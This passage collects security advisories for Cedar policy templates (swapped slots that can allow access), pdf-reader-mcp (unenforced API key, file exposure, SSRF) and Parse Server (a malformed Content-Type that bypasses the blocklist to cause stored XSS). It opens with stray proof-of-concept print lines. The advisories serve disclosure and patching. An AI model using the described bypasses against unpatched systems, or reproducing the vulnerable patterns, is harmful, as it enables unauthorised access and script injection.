    print(f"    method        : {method!r}")
    print(f"    url           : {upstream_url!r}")
    print(f"    authorization : {auth_header!r}")

Cedar users must be using all of the following features to be affected by this advisory: JSON format policies, policy templates, and the is in scope condition. This advisory only affects JSON-formatted Cedar policy templates containing is in scope conditions that are malformed according to the Cedar syntax. It does not affect syntactically well-formed policies.

Users of Cedar who author policies in the JSON format were able to write Cedar policies using the is in condition with an incorrect slot identifier in the principal and resource scope constraints (e.g., ?principal in the resource scope constraint) even though this is not allowed when parsing policies from the Cedar policy syntax. Internally, the slot identifiers were silently corrected (e.g. ?resource is placed in the resource scope constraint).

If the policy contains exactly one slot in either the principal or resource position, then any attempt to create a linked policy from the template results in an error: the internal representation of the template does not contain the slot identifier as written in the malformed JSON policy (it has been corrected silently), so attempting to fill that slot is an error. If instead the template is linked using slot identifier expected internally (i.e., not what is written in the JSON template), the linking will initially succeed, but a subsequent invariant violation will cause a panic.

When the template contains slots in both the principal and resource position, then both slots will be present in the internal representation: linking succeeds, but with each slot bound to the value intended for the other (the silent correction). The linked policy is then semantically different from the malformed policy the user intended, and any subsequent authorization decision made against that policy may lead to accesses being unintentionally allowed or denied.

Concretely, consider the following JSON format policy template intended to deny users in a particular project from accessing documents with a particular classification.

{
  "effect": "forbid",
  "principal": {
    "op": "is",
    "entity_type": "User",
    "in": { "slot": "?resource" }
  },
  "action": { "op": "All" },
  "resource": {
    "op": "is",
    "entity_type": "Doc",
    "in": { "slot": "?principal" }
  },
  "conditions": []
}

Linked with ?principal = Classification::"topsecret" and ?resource = Project::"alpha", the author expects to create the policy:

forbid(principal is User in Project::"alpha", action, resource is Doc in Classification::"topsecret");

But because Cedar internally links slots by scope position (not by name), the actual policy evaluated by the engine is:

forbid(principal is User in Classification::"topsecret", action, resource is Doc in Project::"alpha");

If a user is in Project::"alpha" but not Classification::"topsecret", the forbid policy does not apply, and access is unintentionally allowed.

Patches

This advisory is patched in version 4.11.1 and 3.4.3, both available on Crates.io and NPM.

Workarounds

If you cannot update to a patched version, you can determine if you are affected by checking your JSON format policy templates for the following two patterns.

  "principal": {
    "op": "is",
    "entity_type": "User",
    "in": { "slot": "?resource" }
  }

and

  "resource": {
    "op": "is",
    "entity_type": "Doc",
    "in": { "slot": "?principal" }
  }

Impact

When @sylphx/pdf-reader-mcp is run as an HTTP server (MCP_TRANSPORT=http), it reads the MCP_API_KEY environment variable and logs API key authentication enabled (X-API-Key header) at startup, but it never validated the X-API-Key header on incoming requests. The key was read into a variable and never enforced on the request path.

As a result, the /mcp endpoint accepted unauthenticated requests. Combined with the default bind address of 0.0.0.0 (all interfaces), any client able to reach the port could invoke every PDF tool and read the contents of any PDF the server process could open anywhere on the host. URL-based sources also enable limited SSRF (private/loopback addresses are blocked by default unless --allow-private-ips is set).

The misleading startup log made the exposure silent: an operator who set MCP_API_KEY reasonably believed the server was protected when it was not.

This affects only the opt-in HTTP transport; the default stdio transport is unaffected.

Patches

Fixed in @sylphx/pdf-reader-mcp@3.0.1. The fix enforces the X-API-Key header with a constant-time comparison (rejecting missing/mismatched keys with HTTP 401), changes the default bind host to 127.0.0.1 (loopback), and emits a startup warning when binding a non-loopback host without an API key.

Workarounds

For deployments that cannot upgrade immediately:

  • Bind to loopback only: MCP_HTTP_HOST=127.0.0.1.
  • Place a reverse proxy in front that enforces authentication.
  • Use the default stdio transport instead of HTTP.
  • Restrict filesystem reach with --allow-dir / MCP_PDF_ALLOWED_DIRS.

Reported privately by novice-22 via responsible disclosure.

Impact

Parse Server's file upload validation uses the fileUpload.fileExtensions option (enabled by default with a blocklist) to reject files that browsers may render as active content, mitigating stored cross-site scripting (XSS). When an uploaded file's extension is not recognized by the mime package, Parse Server preserves the client-supplied Content-Type and passes it to the storage adapter. A malformed Content-Type that is not a valid type/subtype media type — for example image (no subtype), image/ (empty subtype), or image//svg+xml (invalid token) — bypassed the blocklist and was stored unchanged. On storage adapters that persist and serve the uploaded Content-Type (such as Amazon S3, Google Cloud Storage, or Azure Blob Storage), a browser cannot parse the malformed Content-Type and falls back to MIME-sniffing the file content; a file whose body begins with HTML markup is then rendered as HTML, executing any embedded script in the application's origin. This allows a user permitted to upload files to store content that executes as script against other users who open the file URL. The default GridFS storage adapter is not affected, as it recomputes the Content-Type from the filename and serves files with X-Content-Type-Options: nosniff.

Patches

The file upload handler now validates that the client-supplied Content-Type is a well-formed media type (type/subtype with non-empty tokens per RFC 9110 §5.6.2) whenever the filename extension is not recognized by mime. Malformed values are rejected instead of being stored, while well-formed types — including custom or vendor types that the mime package does not recognize — continue to be accepted; only blocklisted subtypes are rejected.

Workarounds

Configure fileUpload.fileExtensions as a strict allowlist of only the extensions the application needs (for example ["^(png|jpe?g|gif|pdf)$"]). Additionally, serve uploaded files from a domain separate from the application so that any rendered content is isolated from the application's origin, and configure the storage/CDN layer to send X-Content-Type-Options: nosniff.
